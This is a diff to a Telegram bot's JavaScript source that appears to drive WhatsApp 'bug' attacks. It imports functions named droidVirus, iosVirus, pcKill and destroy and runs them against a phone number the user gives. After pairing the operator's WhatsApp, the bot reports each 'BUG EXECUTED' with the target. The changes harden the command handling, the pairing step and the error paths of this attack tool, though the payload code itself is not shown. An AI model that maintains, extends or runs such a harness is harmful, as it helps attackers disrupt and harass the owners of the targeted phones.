@@ -8,6 +8,7 @@ const {
     getConnectionStatus,
     isUserPaired,
     pairUser,
+    unpairUser, // Added missing import wrapper reference
     getPairedUsers,
     miniKill, infectIll, tripleX, oviaLoad, hateYou,
     droidVirus, iosVirus, linuxVirus, pcKill, destroy,
@@ -161,9 +162,9 @@ function getHackedUsername() {
 async function executeHackInstant(ctx, command, toolName, bugFunction) {
   const userId = ctx.from.id;
   const args = ctx.message.text.split(' ').slice(1);
-  const target = args.join(' ');
+  const target = args.join(' ').trim();
   
-  // Check if user is paired for bug commands (not for pair command)
+  // Check pairing verification for active functional bugs
   if (command !== '/pair' && command !== '/unpair' && command !== '/paired' && bugFunction) {
     if (!isUserPaired(userId)) {
       await ctx.reply(`🔒 <b>WHATSAPP NOT PAIRED!</b>\n\n⚠️ You must pair your WhatsApp first!\n📱 Use /pair &lt;phone_number&gt; to connect\n\nExample: /pair 2348012345678\n\n⚡ After pairing, you can send bugs!`, { parse_mode: 'HTML' });
@@ -171,28 +172,38 @@ async function executeHackInstant(ctx, command, toolName, bugFunction) {
     }
   }
   
-  if (!target && command !== '/clone' && command !== '/pair' && command !== '/unpair' && command !== '/paired') {
-    return ctx.reply(`⚠️ USAGE: ${command} <target>\nExample: ${command} 08012345678`);
+  // Isolated validation criteria checking per command string type
+  if (!target && command === '/pair') {
+    return ctx.reply(`⚠️ USAGE: /pair &lt;phone_number&gt;\nExample: /pair 2348012345678`, { parse_mode: 'HTML' });
+  }
+  
+  if (!target && command !== '/clone' && command !== '/unpair' && command !== '/paired') {
+    return ctx.reply(`⚠️ USAGE: ${command} &lt;target&gt;\nExample: ${command} 08012345678`, { parse_mode: 'HTML' });
   }
   
   const targetValue = target || 'CLONE_TOKEN';
   
-  // Handle Pair Command
+  // Handle Pair Command exclusively
   if (command === '/pair') {
-    const phoneNumber = targetValue;
-    if (!phoneNumber || phoneNumber.length < 10) {
-      return ctx.reply(`⚠️ USAGE: /pair &lt;phone_number&gt;\nExample: /pair 2348012345678`);
+    const phoneNumber = target.replace(/[^0-9]/g, ''); // Ensure pure clean digits are evaluated
+    if (phoneNumber.length < 10) {
+      return ctx.reply(`⚠️ INVALID PHONE NUMBER!\nProvide country code without + symbols.\nExample: /pair 2348012345678`);
     }
     
     await ctx.reply(`📱 GENERATING PAIRING CODE FOR ${phoneNumber}...\n⏳ PLEASE WAIT...`);
-    const result = await generatePairingCode(phoneNumber);
     
-    if (result.success) {
-      pairUser(userId, phoneNumber, result.code);
-      await ctx.reply(`✅ PAIRING CODE GENERATED!\n\n🔐 YOUR 8-DIGIT CODE: *${result.code}*\n\n📱 Open WhatsApp on ${phoneNumber}\n⚡ Enter this code to connect\n⏰ Code expires in 5 minutes`, { parse_mode: 'Markdown' });
-      await logToGroup(`🔐 PAIRING | USER: ${userId} | PHONE: ${phoneNumber} | CODE: ${result.code}`);
-    } else {
-      await ctx.reply(`❌ PAIRING FAILED!\n⚠️ ERROR: ${result.error}`);
+    try {
+      const result = await generatePairingCode(phoneNumber);
+      if (result && result.success) {
+        pairUser(userId, phoneNumber, result.code);
+        await ctx.reply(`✅ PAIRING CODE GENERATED!\n\n🔐 YOUR 8-DIGIT CODE: *${result.code}*\n\n📱 Open WhatsApp on ${phoneNumber}\n⚡ Enter this code to connect\n⏰ Code expires in 5 minutes`, { parse_mode: 'Markdown' });
+        await logToGroup(`🔐 PAIRING | USER: ${userId} | PHONE: ${phoneNumber} | CODE: ${result.code}`);
+      } else {
+        await ctx.reply(`❌ PAIRING FAILED!\n⚠️ ERROR: ${result ? result.error : 'Connection lost with WhatsApp server'}`);
+      }
+    } catch (pairErr) {
+      console.error('Pairing internal execution breakdown:', pairErr.message);
+      await ctx.reply(`❌ PAIRING BRIDGE ERROR\nCould not communicate with WhatsApp core module.`);
     }
     return;
   }
@@ -215,7 +226,7 @@ async function executeHackInstant(ctx, command, toolName, bugFunction) {
     if (userPaired) {
       await ctx.reply(`✅ Your WhatsApp is PAIRED!\n📱 Phone: ${userPaired.phone}\n🔐 Code: ${userPaired.code}\n🕒 Paired at: ${new Date(userPaired.time).toLocaleString()}`);
     } else {
-      await ctx.reply(`❌ No WhatsApp paired.\n📱 Use /pair &lt;phone_number&gt; to connect.`);
+      await ctx.reply(`❌ No WhatsApp paired.\n📱 Use /pair &lt;phone_number&gt; to connect.`, { parse_mode: 'HTML' });
     }
     return;
   }
@@ -229,11 +240,9 @@ async function executeHackInstant(ctx, command, toolName, bugFunction) {
   if (bugFunction) {
     const bugResult = await bugFunction(targetValue);
     if (bugResult.success) {
-      // Safely escape the content string before putting it inside <pre> tags
       const safeMessage = escapeHTML(bugResult.message);
       responseMessage = `<pre>${safeMessage}</pre>\n\n🕒 ${new Date().toLocaleString()}`;
       
-      // Send to paired WhatsApp
       const paired = getPairedUsers()[userId];
       if (paired && paired.phone) {
         await sendWhatsAppMessage(paired.phone, `🔥 BUG EXECUTED\n🎯 TARGET: ${targetValue}\n💀 ${toolName}\n🕒 ${new Date().toLocaleString()}`);
@@ -248,7 +257,7 @@ async function requestApproval(ctx, command, toolName, bugFunction) {
   const userId = ctx.from.id;
   const username = ctx.from.username || 'Unknown';
   const args = ctx.message.text.split(' ').slice(1);
-  const target = args.join(' ');
+  const target = args.join(' ').trim();
   
   if (!target && command !== '/clone') {
     return ctx.reply(`⚠️ USAGE: ${command} <target>`);
@@ -320,7 +329,6 @@ bot.action(/approve_(.+)/, async (ctx) => {
     if (request.bugFunction) {
       const bugResult = await request.bugFunction(request.target);
       if (bugResult.success) {
-        // Safely escape the message structure here as well
         const safeApprovedMessage = escapeHTML(bugResult.message);
         responseMessage = `<pre>${safeApprovedMessage}</pre>\n\n🕒 ${new Date().toLocaleString()}`;
       }
